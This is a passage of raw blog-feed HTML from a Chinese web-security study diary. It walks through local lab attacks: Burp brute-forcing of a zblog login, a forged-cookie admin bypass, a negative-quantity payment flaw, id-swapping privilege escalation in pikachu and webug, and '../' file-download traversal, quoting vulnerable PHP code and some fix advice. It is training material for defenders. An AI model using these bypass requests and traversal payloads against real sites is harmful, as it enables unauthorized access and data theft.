class="language-bash">涉及资源：https://www.zblogcn.com/zblogphp/https://github.com/huyuanzhi2/password_brute_dictionaryhttps://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg 提取码：xiao</code></pre><h3 id="三、zblog-密码爆破"><a href="#三、zblog-密码爆破" class="headerlink" title="三、zblog 密码爆破"></a><font size="5"><strong>三、zblog 密码爆破</strong></font></h3><p><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/2.png"></p><p>安装完成后登陆地址：<a href="http://localhost/zblog/zb_system/login.php">http://localhost/zblog/zb_system/login.php</a><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/3.png"></p><p>burp抓包爆破</p><p>备注一下一个小bug，由于之前一直是在虚拟机中搭建的靶场然后本地测试的，现在呢突然不想在虚拟机中搭建的靶场直接使用的宿主机搭建的，环境是phpstudy+Chrome+SwitchyOmega, 遇到的一个小bug就是SwitchyOmega代理本地的流量时直接使用127.0.0.1加端口，竟然获取不到流量，我还以为是我设置错了，但是这款工具相对来说还是可以不舍得放弃，就在网上找一些攻略终于找到解决方案，在不代理地址列表写上&lt;-loopback&gt;然后burp就可以正常的抓包了。<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/4.png"><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/5.png"></p><p>现在抓到zblog的登录数据，我们可以爆破用户名和密码，将数据包发送的intruder模块当中，设置变量。<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/6.png"><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/7.png"><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/8.png"></p><p>然后点击start，然后按照状态码排序或者是length排序<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/9.png"></p><p>也就是说看到的第65个请求是我们爆破成功的值，通过cmd5解密<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/10.png"><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/11.png"></p><h3 id="四、cookie错弱点验证"><a href="#四、cookie错弱点验证" class="headerlink" title="四、cookie错弱点验证"></a><font size="5"><strong>四、cookie错弱点验证</strong></font></h3><p><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/12.png"></p><p>安装好cms之后我们访问后台登录地址<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/13.png"></p><p>抓包分析，这一串的cookie是浏览器的缓存信息<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/14.png"></p><p>在干净没有访问的过的环境当中是没有带cookie<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/15.png"></p><p>源码分析</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//单一入口模式error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span> //关闭错误显示<span class="token variable">$file</span><span class="token operator">=</span>addslashes<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //接收文件名<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span>?<span class="token string">'index'</span><span class="token keyword">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> //判断为空或者等于indexinclude<span class="token punctuation">(</span><span class="token string">'files/'</span><span class="token keyword">.</span><span class="token variable">$action</span><span class="token keyword">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //载入相应文件?<span class="token operator">></span></code></pre><p>这里的意思就访问这个文件传递参数r,参数r为空执行index否则接受file变量，然后加载对应的文件。files目录结构</p><pre class=" language-bash"><code class="language-bash">adset.phpcolumnlist.phpcommentlist.phpeditcolumn.phpeditlink.phpeditsoft.phpeditwz.phpimageset.phpindex.phplinklist.phplogin.phpmanageinfo.phpnewcolumn.phpnewlink.phpnewsoft.phpnewwz.phpoutlogin.phpreply.phpseniorset.phpsiteset.phpsoftlist.phpwzlist.php</code></pre><p>因为访问的index.php，在审计一下index.php文件,看到的是执行了以下两个文件，对这两文件进行查看。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phprequire <span class="token string">'../inc/checklogin.php'</span><span class="token punctuation">;</span>require <span class="token string">'../inc/conn.php'</span><span class="token punctuation">;</span><span class="token variable">$indexopen</span><span class="token operator">=</span><span class="token string">'class="open"'</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>checklogin.php文件</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>header<span class="token punctuation">(</span><span class="token string">"Location: ?r=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>?<span class="token operator">></span></code></pre><p>这里对user参数接受的cookie进行判断如果为空的话执行login.php程序，所以这里也就造成了若cookie登录的漏洞。</p><p><strong>实验演示：</strong><br>请求这个地址：<a href="http://localhost/cookie/admin/?r=index">http://localhost/cookie/admin/?r=index</a> 并抓包分析。将cookie值改为user&#x3D;aaaaa然后发送数据包</p><pre class=" language-bash"><code class="language-bash">GET /cookie/admin/?r<span class="token operator">=</span>index HTTP/1.1Host: localhostsec-ch-ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>, <span class="token string">" Not A;Brand"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"99"</span>, <span class="token string">"Google Chrome"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>sec-ch-ua-mobile: ?0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9Cookie: user<span class="token operator">=</span>aaaaaaaaaConnection: close</code></pre><p><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/16.png"></p><p>总结：因为这个网站后台的首页的是index通过传参的方式验证登录。登录之前会对cookie进行验证验证由于方式很过于简单只是对cookie是否为空进行判断，也就是说传递的值不是为空程序就认为你是登录了，因此这就形成了弱cookie登录的漏洞。</p><p>上面的这种方式是基于白盒测试的方式，下面演示黑盒测试。</p><p>直接访问前台是没有带cookie的，当我们登录之前是没有任何的cookie的信息<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/17.png"></p><p>当我们登录的数据包也是没有包含cookie信息，这里登录的时候会发送两个数据包。第一个是关于用户和密码第二个是cookie信息<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/18.png"></p><p>我们观察到时用用户名作为cookie的信息，是相当的不安全也就是说这是一个可以伪造的cookie信息。<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/19.png"></p><p>要是我们登录正确之后，访问后台信息，无论干什么都会发现一个cookie信息，用来标识身份</p><p><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/20.png"></p><p>在第二个数据包的时候我们看到了cookie登录信息要是我们伪造一个数据包将cookie信息发送会怎样呢？将数据包发送之后发现确实登录上后台了，也就验证了前面白盒测试的漏洞。<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/21.png"><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/22.png"></p><h3 id="五、shop脆弱支付"><a href="#五、shop脆弱支付" class="headerlink" title="五、shop脆弱支付"></a><font size="5"><strong>五、shop脆弱支付</strong></font></h3><p>可利用漏洞：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a><br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/23.png"></p><p>搭建好网站之后转包分析一手<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/24.png"></p><p>我们修改购买的数量为-1<br><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/25.png"></p><p><strong>订单编号</strong><br>这里我们获取两个订单编码第一个是数量-1的订单编号第二个是订单数量30的订单编号。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-033</title>
      <link href="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/"/>
      <url>/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-逻辑越权之水平垂直越权全解"><a href="#WEB漏洞-逻辑越权之水平垂直越权全解" class="headerlink" title="WEB漏洞-逻辑越权之水平垂直越权全解"></a><font size="6"><strong>WEB漏洞-逻辑越权之水平垂直越权全解</strong></font></h2><span id="more"></span><p><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/1.png"></p><h3 id="一、原理说明"><a href="#一、原理说明" class="headerlink" title="一、原理说明"></a><font size="5"><strong>一、原理说明</strong></font></h3><pre class=" language-bash"><code class="language-bash"> <span class="token comment" spellcheck="true">#水平，垂直越权，未授权访问 </span> 解释，原理，检测，利用，防御等  通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。  使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。  通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。  原理： 前端安全造成：界面 判断用户等级后，代码界面部分进行可选显示 后端安全造成：数据库 user 表<span class="token punctuation">(</span>管理员和普通用户同表<span class="token punctuation">)</span> id,username,password,usertype 1,admin,123456,1 2,xiaodi,11111,2 登录用户 admin 或 xiaodi 时，代码是如何验证这个级别？（usertype 判断） 如果在访问数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修 改，就是测试越权漏洞的基本。  <span class="token comment" spellcheck="true">#修复防御方案</span>1.前后端同时对用户输入信息进行校验，双重验证机制2.调用功能前验证用户是否有权限调用相关功能3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限4.直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</code></pre><p><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/2.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><p>● Pikachu-本地水平垂直越权演示（漏洞成因）<br>● 墨者水平-身份认证失效漏洞实战（漏洞成因）<br>● 越权检测-小米范越权漏洞检测工具（工具使用）<br>● 越权检测-Burpsuite 插件 Authz 安装测试（插件使用）</p><h3 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a><font size="5"><strong>三、涉及资源</strong></font></h3><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a><br><a href="http://pan.baidu.com/s/1pLjaQKF">http://pan.baidu.com/s/1pLjaQKF</a> (privilegechecker)<br><a href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a><br><a href="https://github.com/alphaSeclab/awesome-burp-suite">https://github.com/alphaSeclab/awesome-burp-suite</a></p><h3 id="四、pikachu"><a href="#四、pikachu" class="headerlink" title="四、pikachu"></a><font size="5"><strong>四、pikachu</strong></font></h3><p>● 水平越权<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/3.png"></p><p>将kobe改为Lucy实现水平越权漏洞<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/4.png"></p><p>● 垂直越权<br>先用admin&#x2F;123456账户创建用户并用burp抓包发送到repeter模块当中，在proxy模块中将数据包丢弃。然后换普通用户pikachu&#x2F;000000登录在浏览器中获取cookie将获取的cookie的替换为repeater中的cookie最后发送<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/5.png"><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/6.png"><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/7.png"></p><pre class=" language-bash"><code class="language-bash">垂直越权:添加用户前提条件:获取的添加用户的数据包怎么来的数据包:1.普通用户前端有操作界面可以抓取数据包2.通过网站源码本地搭建自己去模拟抓取3.盲猜</code></pre><h3 id="五、webug越权"><a href="#五、webug越权" class="headerlink" title="五、webug越权"></a><font size="5"><strong>五、webug越权</strong></font></h3><p>docker搭建webug数据库密码toor<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/8.png"></p><p>源码分析</p><pre class=" language-bash"><code class="language-bash">root@9397cdeda7a6:/<span class="token comment" spellcheck="true"># cat `find / -name cross_auth_passwd.php`</span><span class="token operator">&lt;</span>?phprequire_once <span class="token string">"../../common/common.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    header<span class="token punctuation">(</span><span class="token string">"Location:../login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>empty<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>empty<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT id, username, password FROM user_test WHERE username = '&amp;#123;<span class="token variable">$username</span>&amp;#125;' AND password = '&amp;#123;<span class="token variable">$password</span>&amp;#125;'"</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$dbConnect</span>-<span class="token operator">></span>query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> mysqli_fetch_assoc<span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            header<span class="token punctuation">(</span><span class="token string">"Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id=&amp;#123;<span class="token variable">$id</span>&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>require_once TPMELATE.<span class="token string">"/cross_auth_passwd.html"</span><span class="token punctuation">;</span>mysql<span class="token operator">></span> use webug<span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> aaaaa    <span class="token operator">|</span> asdfsadf <span class="token operator">|</span>+----+----------+----------+2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>这里可以看见的是对传入的username和password参数没有修改也就是说这里依然使用SQL注入的风险，但是这里主要是越权也就先不讨论SQL注入的问题。</p><p>使用账号admin密码admin登录出现以下情况。作为小白的我还以为是靶场这样设置的，查了资料后才发现，艹原来这里是个坑<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/9.png"></p><p>修改代码如下将17行的绝对路径换为相对路径</p><pre class=" language-bash"><code class="language-bash">root@9397cdeda7a6:~<span class="token comment" spellcheck="true"># tail -8 /var/www/html/control/auth_cross/cross_auth_passwd.php|head -1</span>            header<span class="token punctuation">(</span><span class="token string">"Location:./cross_auth_passwd2.php?id=&amp;#123;<span class="token variable">$id</span>&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root@9397cdeda7a6:~<span class="token comment" spellcheck="true">#</span></code></pre><p>正常情况是admin用户只能修改admin的密码，aaaaa用户只能修改aaaaa用户的密码,如现在admin用户的密码是admin。我将它修改为123456</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> aaaaa    <span class="token operator">|</span> 123456   <span class="token operator">|</span>+----+----------+----------+2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/10.png"></p><p>可以看到的是我们修改的是成功了，但是呢也发现了一个问题上面传递了参数id&#x3D;1,而在数据库中刚好有id这一字段也就是说啊，他是通过id来验证用户，那我们试着换下id的参数<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/11.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456   <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> aaaaa    <span class="token operator">|</span> admin    <span class="token operator">|</span>+----+----------+----------+2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>在数据库中我们发现id&#x3D;2的用户密码确实也被修改了，也就是说这里确实存在越权的漏洞。</p><h3 id="六、burp安装插件"><a href="#六、burp安装插件" class="headerlink" title="六、burp安装插件"></a><font size="5"><strong>六、burp安装插件</strong></font></h3><h4 id="Authz"><a href="#Authz" class="headerlink" title="Authz"></a><font size="4"><strong>Authz</strong></font></h4><p><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/12.png"></p><p>安装好之后出现<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/13.png"></p><p>如何使用插件：我们通过代理获取网站登录的数据包，并将数据包发送的instruder模块当中(可以制作出大量类似的数据包，当然也可以直接发送到authz插件当中)<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/14.png"><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/15.png"></p><p>将这些数据包发送到插件当中<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/16.png"></p><p>在插件当中运行，设置好cookie选中所有的数据包右击运行<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/17.png"></p><p>最后获得200和302的状态码，这里也就可以看出哪些是可以正常登陆哪些是错误的。</p><h4 id="AuthMatrix"><a href="#AuthMatrix" class="headerlink" title="AuthMatrix"></a><font size="4"><strong>AuthMatrix</strong></font></h4><p>这个插件是python写的先提前安装python的环境<a href="https://blog.csdn.net/u013175604/article/details/84837360">https://blog.csdn.net/u013175604/article/details/84837360</a></p><p>环境地址：<a href="https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.2/jython-standalone-2.7.2.jar">https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.2/jython-standalone-2.7.2.jar</a><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/18.png"><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/19.png"></p><p>这个插件的设置要相对于之前的那个难度要大一些，也不是很难。<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/20.png"><br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/21.png"></p><p>将之前的用户提交的cookie信息获取，另外一个用户也是一样<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/22.png"></p><p>将数据包发送至插件当中<br><img src="/2023/10/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-033/23.png"><br>然后将在模块当中run就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-032</title>
      <link href="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/"/>
      <url>/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件操作之文件下载读取全解"><a href="#WEB漏洞-文件操作之文件下载读取全解" class="headerlink" title="WEB漏洞-文件操作之文件下载读取全解"></a><font size="6"><strong>WEB漏洞-文件操作之文件下载读取全解</strong></font></h2><span id="more"></span><p><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/1.png"></p><pre class=" language-bash"><code class="language-bash">文件下载，读取 原理，检测，利用，修复等  <span class="token comment" spellcheck="true">#利用</span>数据库配置文件下载或读取后续接口密匙信息文件下载或读取后续<span class="token comment" spellcheck="true">#文件名，参数值，目录符号</span>read.xxx?filename<span class="token operator">=</span>down.xxx?filename<span class="token operator">=</span>readfile.xxx?file<span class="token operator">=</span>downfile.xxx?file<span class="token operator">=</span><span class="token punctuation">..</span>/ <span class="token punctuation">..</span>\ .\ ./等%00 ? %23 %20 .等<span class="token operator">&amp;</span>readpath<span class="token operator">=</span>、<span class="token operator">&amp;</span>filepath<span class="token operator">=</span>、<span class="token operator">&amp;</span>path<span class="token operator">=</span>、<span class="token operator">&amp;</span>inputfile<span class="token operator">=</span>、<span class="token operator">&amp;</span>url<span class="token operator">=</span>、<span class="token operator">&amp;</span>data<span class="token operator">=</span>、<span class="token operator">&amp;</span>readfile<span class="token operator">=</span>、<span class="token operator">&amp;</span>menu<span class="token operator">=</span>、META-INF<span class="token operator">=</span> 、WEB-INF1.文件被解析，则是文件包含漏洞2.显示源代码，则是文件读取漏洞3.提示文件下载，则是文件下载漏洞下载或文件读取漏洞：对应文件：配置文件（数据库，平台，各种等）<span class="token comment" spellcheck="true">#各种协议调用配合</span></code></pre><h3 id="一、pikachu文件下载漏洞"><a href="#一、pikachu文件下载漏洞" class="headerlink" title="一、pikachu文件下载漏洞"></a><font size="5"><strong>一、pikachu文件下载漏洞</strong></font></h3><p>正常下载文件获取地址以科比的地址为例</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.7/vul/unsafedownload/execdownload.php?filename<span class="token operator">=</span>kb.png正常看到的是传递的参数filename<span class="token operator">=</span>kb.png获取指定下载的文件地址，要是我们更改下载的文件地址就会形成文件下载漏洞http://10.1.1.7/vul/unsafedownload/download/kb.png这个是网站的存储的文件地址通过上面的两个下载的地址我们可以可以测试文件下载漏洞http://10.1.1.7/vul/unsafedownload/execdownload.php?filename<span class="token operator">=</span><span class="token punctuation">..</span>/execdownload.php</code></pre><p>根据上面的分析通过链接下载到了文件execdownload.php</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$PIKA_ROOT_DIR</span> <span class="token operator">=</span>  <span class="token string">"../../"</span><span class="token punctuation">;</span>include_once <span class="token variable">$PIKA_ROOT_DIR</span><span class="token keyword">.</span><span class="token string">"inc/function.php"</span><span class="token punctuation">;</span>header<span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// <span class="token variable">$file_name</span><span class="token operator">=</span><span class="token string">"cookie.jpg"</span><span class="token punctuation">;</span><span class="token variable">$file_path</span><span class="token operator">=</span><span class="token string">"download/&amp;#123;<span class="token variable">$_GET</span>['filename']&amp;#125;"</span><span class="token punctuation">;</span>//用以解决中文不能显示出来的问题<span class="token variable">$file_path</span><span class="token operator">=</span>iconv<span class="token punctuation">(</span><span class="token string">"utf-8"</span>,<span class="token string">"gb2312"</span>,<span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//首先要判断给定的文件存在与否if<span class="token punctuation">(</span><span class="token operator">!</span>file_exists<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    skip<span class="token punctuation">(</span><span class="token string">"你要下载的文件不存在，请重新下载"</span>, <span class="token string">'unsafe_down.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token variable">$fp</span><span class="token operator">=</span>fopen<span class="token punctuation">(</span><span class="token variable">$file_path</span>,<span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_size</span><span class="token operator">=</span>filesize<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//下载文件需要用到的头ob_clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//输出前一定要clean一下，否则图片打不开Header<span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Header<span class="token punctuation">(</span><span class="token string">"Accept-Ranges: bytes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Header<span class="token punctuation">(</span><span class="token 